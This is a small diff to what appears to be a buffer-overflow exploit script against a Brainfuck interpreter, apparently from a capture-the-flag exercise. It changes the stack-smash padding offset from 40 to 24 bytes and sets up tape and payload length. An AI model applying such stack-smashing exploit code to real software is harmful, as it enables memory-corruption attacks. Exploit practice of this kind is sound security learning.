@@ -2,7 +2,7 @@ from bf_parser.bf_parser import *
 
 p = BF_Parser(",.")
 
-offset = b"A" * 40 # offset until stack smash ; added for debugging
+offset = b"A" * 24 # offset until stack smash ; added for debugging
 tape = b"\x00" * 1024 # the brainfuck tape
 
 payload_len = p.get_payload_len()
